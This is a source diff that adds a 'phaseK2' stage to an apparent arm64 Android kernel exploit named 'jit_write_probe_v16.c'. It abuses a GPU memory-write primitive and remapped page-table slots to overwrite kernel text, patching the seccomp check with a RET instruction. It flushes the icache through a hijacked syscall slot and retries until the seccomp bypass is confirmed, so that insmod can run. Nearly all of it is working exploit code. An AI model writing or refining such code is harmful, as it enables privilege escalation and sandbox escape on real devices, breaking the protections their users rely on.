@@ -1,0 +1,155 @@
+--- backup/pre-v13-20261108-183651/probe/jit_write_probe_v16.c	2026-11-08 18:36:51.430423500 +0800
++++ hlk-root-dist/probe/jit_write_probe_v16.c	2026-11-08 18:44:24.361188200 +0800
+@@ -2017,6 +2017,44 @@
+ 	return !(WIFSIGNALED(st) && WTERMSIG(st) == SIGSYS);
+ }
+ 
++/* ---- v1.3: functional arbiter for the phaseK seccomp text patch --------
++ *
++ * The MMU-dump readback is NOT authoritative (C-40): a GPU text write can be
++ * live while CPU-side dump_phys_batch() still returns the old cache line.
++ * phaseK used to gate its icache flush on that readback, so a false negative
++ * left some CPUs executing the stale prologue of __secure_computing() and
++ * insmod died with SIGSYS (rc=159, RESEARCH_LOG section 36.5).
++ *
++ * 104 is an arm64 sys_ni_syscall hole and is NOT on the app seccomp
++ * allowlist (C-19).  Calling it in a throwaway child is completely harmless:
++ * with the filter active the child is killed by SIGSYS; with the patch live
++ * it simply returns -ENOSYS.  sc_allowed() already implements exactly the
++ * fork + poll + reap pattern, so reuse it instead of trusting any readback. */
++static int seccomp_bypassed(void)
++{
++	return sc_allowed(104);
++}
++
++/* Invalidate the kernel text page holding @va on every online CPU.  The
++ * hijacked syscall slot still points at flush_icache_range() here.  Calling
++ * this unconditionally is harmless, and phaseK2 needs it after a retry. */
++static void flush_text_page(uint64_t va)
++{
++	int ki;
++	uint64_t pg = va & ~(uint64_t)(PAGE - 1);
++
++	for (ki = 0; ki < g_ncpu; ki++) {
++		cpu_set_t cs;
++		CPU_ZERO(&cs);
++		CPU_SET(g_cpus[ki], &cs);
++		if (sched_setaffinity(0, sizeof(cs), &cs) != 0)
++			continue;
++		(void)syscall(g_hook_slot, (long)pg, (long)(pg + PAGE));
++		icache_sled();
++	}
++	pin_cpu();
++}
++
+ static void pick_hook_candidates(void)
+ {
+ 	int n, pass;
+@@ -4295,27 +4333,89 @@
+ 						     sig_landed ? "landed" : "not visible",
+ 						     kpatches[pi].tag);
+ 					}
+-					if (sig_landed) {
+-						int ki;
+-						uint64_t pg2 = va_sig & ~(PAGE - 1);
+-						for (ki = 0; ki < g_ncpu; ki++) {
+-							cpu_set_t cs;
+-							CPU_ZERO(&cs);
+-							CPU_SET(g_cpus[ki], &cs);
+-							if (sched_setaffinity(0,
+-								sizeof(cs), &cs) != 0)
+-								continue;
+-							(void)syscall(g_hook_slot,
+-								(long)pg2,
+-								(long)(pg2 + PAGE));
+-							icache_sled();
+-						}
+-						pin_cpu();
+-						mark("phaseK: %s applied",
+-						     kpatches[pi].tag);
++					/* v1.3: the readback is a hint, not a verdict.
++					 * Always flush the seccomp text page, even when
++					 * dump_phys_batch() could not see the new word:
++					 * the GPU write can be live while the CPU-side
++					 * dump still returns a stale cache line. */
++					if (sig_landed ||
++					    strcmp(kpatches[pi].sym,
++						   "seccomp_bypass") == 0) {
++						flush_text_page(va_sig);
++						mark("phaseK: %s applied%s",
++						     kpatches[pi].tag,
++						     sig_landed ? "" :
++						     " (forced, readback stale)");
+ 					}
+ 					}
+ 				}
++
++			/* ---- phaseK2 (v1.3): deterministic seccomp bypass ----
++			 *
++			 * phaseK points L2 slot 501 at a 2 MB block, writes one
++			 * word, then RE-POINTS THE SAME SLOT at a different
++			 * block for the next patch.  The GPU walker caches that
++			 * translation, so the first write after a re-point can
++			 * silently go to the old block (phaseJ has the same
++			 * failure and works around it with a fresh channel).
++			 *
++			 * Instead of believing the readback we ask the kernel:
++			 * is syscall 104 still SIGSYS'd?  If it is, redo ONLY
++			 * the single-word seccomp patch through a NEVER-USED
++			 * L2 slot (504/505), which forces a fresh page-table
++			 * walk, then ask again.  Bounded to 2 extra GPU writes
++			 * and only on the failure path.
++			 *
++			 * Even if this still fails the boot is NOT lost:
++			 * ksu_bootstrap.sh v1.3 retries insmod through a
++			 * seccomp-free call_usermodehelper() kernel thread. */
++			{
++				const char *rtry = getenv("PROBE_SECCOMP_RETRY");
++				int maxtry = (!rtry || !*rtry) ? 2 : atoi(rtry);
++				int secok = seccomp_bypassed();
++				int t2;
++
++				if (maxtry > 3)
++					maxtry = 3;
++				if (maxtry < 0)
++					maxtry = 0;
++				mark("phaseK2: seccomp functional=%d retries=%d",
++				     secok, maxtry);
++				for (t2 = 0; t2 < maxtry && !secok; t2++) {
++					int slot = 504 + t2;
++					uint64_t off2 =
++						ksym_off("seccomp_bypass");
++					uint64_t pa2 = img_base + off2;
++					uint64_t va2 = l2_base +
++						(uint64_t)slot * BLOCK_2M +
++						(pa2 & (BLOCK_2M - 1));
++
++					if (off2 == ~0ull) {
++						mark("phaseK2: no seccomp symbol");
++						break;
++					}
++					if (chan_map_block(fd, jc1, fd2, jc2,
++							   pte_slot, l2_win,
++							   g_l2_pa, slot,
++							   pa2 & ~(BLOCK_2M - 1),
++							   &atom_num) != 0) {
++						mark("phaseK2: slot%d remap failed",
++						     slot);
++						continue;
++					}
++					gpu_write32(fd2, jc2, va2,
++						    0xD65F03C0u, atom_num++);
++					cache_thrash(32ull << 20);
++					flush_text_page(rt_text + off2);
++					usleep(50000);
++					secok = seccomp_bypassed();
++					mark("phaseK2: retry %d slot=%d functional=%d",
++					     t2 + 1, slot, secok);
++				}
++				mark("phaseK2: seccomp bypass %s",
++				     secok ? "CONFIRMED" :
++				     "FAILED (UMH fallback will cover insmod)");
++			}
+ 			wcc16 = rt_text + off_commit;
+ 			/* phaseJ re-mapped the scratch window, and the first
+ 			 * entry-262 write after it did not always land (the
